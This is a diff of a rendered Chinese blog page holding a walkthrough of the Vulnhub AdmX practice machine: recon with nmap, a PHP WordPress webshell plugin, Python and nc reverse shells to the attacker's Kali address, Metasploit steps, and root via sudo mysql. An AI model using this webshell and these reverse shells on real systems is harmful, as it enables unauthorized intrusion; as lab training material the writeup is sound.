@@ -136,30 +136,12 @@
         <li><a class="icon" aria-label="下一篇" href="/2022/04/01/3.%20Vulnhub%20Chronos%20Writeup/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
       </ul>
       <span id="i-prev" class="info" style="display:none;">上一篇</span>
       <span id="i-next" class="info" style="display:none;">下一篇</span>
       <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
     </span>
     <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hdfzzf.github.io/2022/04/03/4.%20Vulnhub%20AdmX%20writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hdfzzf.github.io/2022/04/03/4.%20Vulnhub%20AdmX%20writeup/&text=4. Vulnhub AdmX writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hdfzzf.github.io/2022/04/03/4.%20Vulnhub%20AdmX%20writeup/&title=4. Vulnhub AdmX writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hdfzzf.github.io/2022/04/03/4.%20Vulnhub%20AdmX%20writeup/&is_video=false&description=4. Vulnhub AdmX writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=4. Vulnhub AdmX writeup&body=Check out this article: https://hdfzzf.github.io/2022/04/03/4.%20Vulnhub%20AdmX%20writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hdfzzf.github.io/2022/04/03/4.%20Vulnhub%20AdmX%20writeup/&title=4. Vulnhub AdmX writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2022/04/03/4.%20Vulnhub%20AdmX%20writeup/&title=4. Vulnhub AdmX writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2022/04/03/4.%20Vulnhub%20AdmX%20writeup/&title=4. Vulnhub AdmX writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2022/04/03/4.%20Vulnhub%20AdmX%20writeup/&title=4. Vulnhub AdmX writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/04/03/4.%20Vulnhub%20AdmX%20writeup/&name=4. Vulnhub AdmX writeup&description=&lt;p&gt;该靶机难度中等。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2022/04/03/4.%20Vulnhub%20AdmX%20writeup/&t=4. Vulnhub AdmX writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
     <div id="toc">
       <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF"><span class="toc-number">2.</span> <span class="toc-text">配置信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%95%E7%94%A8%E6%88%B7%E6%A8%A1%E5%BC%8F"><span class="toc-number">3.</span> <span class="toc-text">单用户模式</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">4.</span> <span class="toc-text">渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">4.1.</span> <span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">4.2.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="toc-number">4.3.</span> <span class="toc-text">端口服务发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEhttp%E6%9C%8D%E5%8A%A1"><span class="toc-number">4.4.</span> <span class="toc-text">访问http服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bp%E8%87%AA%E5%8A%A8%E6%9B%BF%E6%8D%A2"><span class="toc-number">4.5.</span> <span class="toc-text">BP自动替换</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="toc-number">4.6.</span> <span class="toc-text">密码爆破</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0get-shell"><span class="toc-number">4.7.</span> <span class="toc-text">后台get shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D"><span class="toc-number">4.7.1.</span> <span class="toc-text">第一种</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D"><span class="toc-number">4.7.2.</span> <span class="toc-text">第二种</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E7%A7%8D"><span class="toc-number">4.7.3.</span> <span class="toc-text">第三种</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell%E5%8D%87%E7%BA%A7"><span class="toc-number">4.8.</span> <span class="toc-text">shell升级</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">4.9.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">4.10.</span> <span class="toc-text">权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#wpadmin%E6%9D%83%E9%99%90"><span class="toc-number">4.10.1.</span> <span class="toc-text">wpadmin权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#root%E6%9D%83%E9%99%90"><span class="toc-number">4.10.2.</span> <span class="toc-text">root权限</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol>
     </div>
@@ -186,8 +168,6 @@
     <div class="postdate">
       
         <time datetime="2022-04-02T16:00:00.000Z" itemprop="datePublished">2022-04-03</time>
-        
-        (Updated: <time datetime="2022-04-06T12:12:52.973Z" itemprop="dateModified">2022-04-06</time>)
         
       
     </div>
@@ -249,25 +229,21 @@
 <p>一定要是 rw，否则无法修改配置文件！</p>
 <p>然后按<code>ctrl+x</code>或者F10启动。然后输入<code>ip a</code>查看网卡信息：</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403205339.png" /></p>
-<p>查看网络配置文件中的网卡名称（该靶机的系统是Ubuntu，因此选第二个）： <pre class="line-numbers language-none"><code class="language-none"># RedHat Linux
-vi &#x2F;etc&#x2F;network&#x2F;interfaces
-
-# UBUNTU
-vi &#x2F;etc&#x2F;netplan&#x2F;00-installer-config.yaml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>查看网络配置文件中的网卡名称（该靶机的系统是Ubuntu，因此选第二个）： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># RedHat Linux</span><br><span class="line">vi /etc/network/interfaces</span><br><span class="line"></span><br><span class="line"># UBUNTU</span><br><span class="line">vi /etc/netplan/00-installer-config.yaml</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403205436.png" /></p>
 <p>将 ens33 修改成功网卡信息中的红框位置的名字。然后保存并退出，重启计算机即可获得IP。</p>
 <h1 id="渗透">渗透</h1>
 <p>kali：10.0.2.4</p>
 <h2 id="主机发现">主机发现</h2>
-<pre class="line-numbers language-none"><code class="language-none">sudo nmap -sn 10.0.2.0&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sn 10.0.2.0/24</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402214748.png" /></p>
 <p>1,2,3其实都不是；4是kali，因此靶机IP为10.0.2.5</p>
 <h2 id="端口扫描">端口扫描</h2>
-<pre class="line-numbers language-none"><code class="language-none">sudo nmap -p1-65535 10.0.2.5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p1-65535 10.0.2.5</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402215226.png" /></p>
 <p>只开了一个80端口</p>
 <h2 id="端口服务发现">端口服务发现</h2>
-<pre class="line-numbers language-none"><code class="language-none">sudo nmap -p80 -sV 10.0.2.5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p80 -sV 10.0.2.5</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402215338.png" /></p>
 <ol type="1">
 <li>靶机系统是Ubuntu</li>
@@ -275,7 +251,7 @@ vi &#x2F;etc&#x2F;netplan&#x2F;00-installer-config.yaml<span aria-hidden="true" 
 <li>apache 版本 2.4.13</li>
 </ol>
 <h2 id="访问http服务">访问http服务</h2>
-<p>访问之后发现就是一个apache的页面，没有其他信息，因此直接进行web路径扫描。这里使用新的工具feroxbuster。 <pre class="line-numbers language-none"><code class="language-none">feroxbuster --url http:&#x2F;&#x2F;10.0.2.5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>访问之后发现就是一个apache的页面，没有其他信息，因此直接进行web路径扫描。这里使用新的工具feroxbuster。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">feroxbuster --url http://10.0.2.5</span><br></pre></td></tr></table></figure></p>
 <p>（注意，如果报错仔细看信息，可能是因为没有字典）</p>
 <p>该工具不自带字典，因此有两种方法：</p>
 <ul>
@@ -329,22 +305,7 @@ vi &#x2F;etc&#x2F;netplan&#x2F;00-installer-config.yaml<span aria-hidden="true" 
 <p>先查看现有的两个插件的写法，发现有一个共同点，那就是头文件！</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402232516.png" /></p>
 <p>得包含这些东西</p>
-<p>因此，写一个如下插件： <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token comment">/*
-* Plugin Name: webshell
-* Plugin URI: https://hdfzzf.github.io
-* Descritption: WP webshell for pentest
-* Version: 1.0
-* Author: hdfzzf
-* Author URI: https://hdfzzf.github.io
-* License: https://hdfzzf.github.io
-*/</span>
-
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-<span class="token punctuation">&#123;</span>
-	<span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>因此，写一个如下插件： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Plugin Name: webshell</span></span><br><span class="line"><span class="comment">* Plugin URI: https://hdfzzf.github.io</span></span><br><span class="line"><span class="comment">* Descritption: WP webshell for pentest</span></span><br><span class="line"><span class="comment">* Version: 1.0</span></span><br><span class="line"><span class="comment">* Author: hdfzzf</span></span><br><span class="line"><span class="comment">* Author URI: https://hdfzzf.github.io</span></span><br><span class="line"><span class="comment">* License: https://hdfzzf.github.io</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	system(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>（经过测试，如果不写头部信息，插件安装会不成功）</p>
 <p>安装成功后需要激活插件</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402233227.png" /></p>
@@ -357,34 +318,16 @@ vi &#x2F;etc&#x2F;netplan&#x2F;00-installer-config.yaml<span aria-hidden="true" 
 <li>nc拿shell</li>
 <li>msf</li>
 </ol>
-<p>kali监听 3333 端口，然后网页输入如下命令： <pre class="line-numbers language-python" data-language="python"><code class="language-python">python3 <span class="token operator">-</span>c <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.4",3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>kali监听 3333 端口，然后网页输入如下命令： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.2.4&quot;,3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure></p>
 <p>也可以通过nc串联：</p>
-<p>kali监听两个端口，然后网页执行下面 命令： <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">nc</span> <span class="token number">10.0</span>.2.4 <span class="token number">3333</span><span class="token operator">|</span>/bin/bash<span class="token operator">|</span><span class="token function">nc</span> <span class="token number">10.0</span>.2.4 <span class="token number">4444</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
-<p>不过这里再介绍一种，那就是msf反弹shell。 <pre class="line-numbers language-none"><code class="language-none">1. msfconsole  启动msf
-2. search wordpress admin
-3. use 2  选择第二个
-4. show options
-5. 设置参数
-6. run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>kali监听两个端口，然后网页执行下面 命令： <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 10.0.2.4 3333|/bin/bash|nc 10.0.2.4 4444</span><br></pre></td></tr></table></figure></p>
+<p>不过这里再介绍一种，那就是msf反弹shell。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. msfconsole  启动msf</span><br><span class="line">2. search wordpress admin</span><br><span class="line">3. use 2  选择第二个</span><br><span class="line">4. show options</span><br><span class="line">5. 设置参数</span><br><span class="line">6. run</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402235756.png" /></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402235736.png" /></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402235840.png" /></p>
 <p>成功！</p>
 <h2 id="shell升级">shell升级</h2>
-<p>提权获得的shell是残缺的，无法完成互动操作，比如修改代码，自动补齐。因此，接下来需要升级（以python get shell做示范。该方法只针对bash） <pre class="line-numbers language-none"><code class="language-none">1. python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;
-2. ctrl+z 将获得的shell暂停，切到后台
-3. stty raw -echo
-4. fg 将刚刚放入后台的进程切到前台
-5. export SHELL&#x3D;&#x2F;bin&#x2F;bash
-6. export TERM&#x3D;screen
-7. stty rows 38 columns 116 设置大小
-8. reset
-9. shell成功升级
-
-注意：如果kali使用的是zsh，需要切换为bash。
-	1. chsh -s &#x2F;bin&#x2F;bash（不能加sudo，否则修改的是root的shell）
-	2. 重启
-	3. echo $SHELL 确认一下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>提权获得的shell是残缺的，无法完成互动操作，比如修改代码，自动补齐。因此，接下来需要升级（以python get shell做示范。该方法只针对bash） <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1. python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">2. ctrl+z 将获得的shell暂停，切到后台</span><br><span class="line">3. stty raw -echo</span><br><span class="line">4. fg 将刚刚放入后台的进程切到前台</span><br><span class="line">5. export SHELL=/bin/bash</span><br><span class="line">6. export TERM=screen</span><br><span class="line">7. stty rows 38 columns 116 设置大小</span><br><span class="line">8. reset</span><br><span class="line">9. shell成功升级</span><br><span class="line"></span><br><span class="line">注意：如果kali使用的是zsh，需要切换为bash。</span><br><span class="line">	1. chsh -s /bin/bash（不能加sudo，否则修改的是root的shell）</span><br><span class="line">	2. 重启</span><br><span class="line">	3. echo $SHELL 确认一下</span><br></pre></td></tr></table></figure></p>
 <p><strong>如果利用nc获得一个shell，容易不小心按ctrl+c或者某种原因退出了shell。并且，有的web程序不能多次触发漏洞反弹shell（可能触发一次后环境就变了，只能等待对方重启服务器）。因此，获得一个shell后，应该基于这个shell去获得2-3个shell，比如一句话木马</strong></p>
 <p>回想刚刚后台get shell的第二种方法，此时已经获得了shell，因此可以修改php文件（或者添加php文件）来用其他工具连接，比如蚁剑。</p>
 <p>这里修改主题里面的404.php文件，也就是刚刚修改不成功的那个。</p>
@@ -417,16 +360,14 @@ vi &#x2F;etc&#x2F;netplan&#x2F;00-installer-config.yaml<span aria-hidden="true" 
 <p>（如果刚刚没有升级shell，这里无法连接数据库！！！） 刚刚发现得到了系统内核，用msf查找，发现没有漏洞可以利用。</p>
 <p>接下来查看sudo配置 <code>sudo -l</code></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403195815.png" /></p>
-<p>发现，wpadmin可以以root权限启动数据库，因此，输入下面的命令启动数据库，经过尝试，密码也是adam14。 <pre class="line-numbers language-none"><code class="language-none">sudo &#x2F;urs&#x2F;bin&#x2F;mysql -u root -D wordpress -p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>发现，wpadmin可以以root权限启动数据库，因此，输入下面的命令启动数据库，经过尝试，密码也是adam14。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /urs/bin/mysql -u root -D wordpress -p</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403195950.png" /></p>
 <p>成功登录数据库。</p>
 <blockquote>
 <p>小知识：数据库可以利用 system cmd 执行系统命令。这里我们是以root方式启动的数据库，因此使用system执行命令的时候也是root权限。</p>
 </blockquote>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403200101.png" /></p>
-<p>执行 <pre class="line-numbers language-none"><code class="language-none">system &#x2F;bin&#x2F;bash -i
-
--i 表示shell表示bash是交互的。其实这里不加也没关系<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
+<p>执行 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">system /bin/bash -i</span><br><span class="line"></span><br><span class="line">-i 表示shell表示bash是交互的。其实这里不加也没关系</span><br></pre></td></tr></table></figure></p>
 <p>获得root权限的shell</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403200246.png" /></p>
 <p>成功拿到flag，也成功得到root权限。至此，这个靶机结束！</p>
@@ -490,7 +431,6 @@ vi &#x2F;etc&#x2F;netplan&#x2F;00-installer-config.yaml<span aria-hidden="true" 
     <div id="actions-footer">
         <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
         <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
         <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
     </div>
 
